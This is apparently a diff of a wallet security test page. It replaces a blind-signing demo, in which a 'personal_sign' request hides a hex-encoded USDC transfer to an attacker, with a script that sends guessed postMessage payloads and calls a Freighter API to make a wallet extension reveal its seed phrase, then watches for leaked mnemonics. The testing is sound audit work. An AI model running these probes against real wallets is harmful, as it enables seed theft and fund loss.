@@ -1,40 +1,20 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <title>Uji Keamanan: Blind Signing</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; padding: 20px; }
-        .box { border: 2px solid #ddd; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        .alert { background-color: #fff3cd; border-left: 5px solid #ffc107; padding: 15px; }
-        button { padding: 15px 25px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
-        .btn-phish { background-color: #d9534f; color: white; }
-    </style>
-</head>
-<body>
-
-    <div class="box">
-        <h3>Simulasi Celah Keamanan: Blind Signing</h3>
-        <p class="alert">
-            <strong>Catatan Audit:</strong> Situs ini mencoba meminta izin untuk mentransfer USDC Anda menggunakan <code>personal_sign</code>. 
-            Dompet yang aman harus memperingatkan bahwa data ini berisi perintah transfer token, bukan sekadar pesan teks biasa.
-        </p>
-        
-        <button class="btn-phish" id="btnExploit">Minta Akses Transfer USDC (Berbahaya)</button>
-    </div>
-
-    <script>
-        document.getElementById('btnExploit').addEventListener('click', async () => {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
-            // Hex ini adalah pesan: "Transfer 5000 USDC ke Kontrak Penyerang 0xAttacker..."
-            // Dalam serangan nyata, dApp akan menyembunyikan instruksi ini di sini
-            const maliciousData = "0x5472616e736665722035303030205553444320746f20307841747461636b6572"; 
-            
-            // Penggunaan personal_sign untuk transaksi sensitif adalah celah keamanan tinggi
-            // karena dompet tidak bisa membedakan ini dengan tanda tangan login biasa
-            await window.ethereum.request({ method: 'personal_sign', params: [maliciousData, accounts[0]] });
-        });
-    </script>
-</body>
-</html>
+<button id="btn">TRY TRIGGER BACKUP DISPLAY</button>
+<script>
+const payloads=[
+  {type:"SHOW_SECRET"},
+  {type:"SHOW_SECRET", request:{type:"SHOW_SECRET"}},
+  {method:"showBackup", type:"UI"},
+  {request:{type:"SHOW_MNEMONIC"}},
+  {id:1, type:"openBackupPhrase"},
+  {jsonrpc:"2.0", method:"showBackupPhrase"},
+];
+document.getElementById('btn').onclick=()=>{
+  payloads.forEach(p=> window.postMessage(p,"*"));
+  if(window.freighterApi && window.freighterApi.showBackup)
+    window.freighterApi.showBackup();
+};
+window.addEventListener('message',(e)=>{
+  if(JSON.stringify(e.data).toLowerCase().includes('mnemonic'))
+    alert('SEED LEAK FOUND!');
+});
+</script>
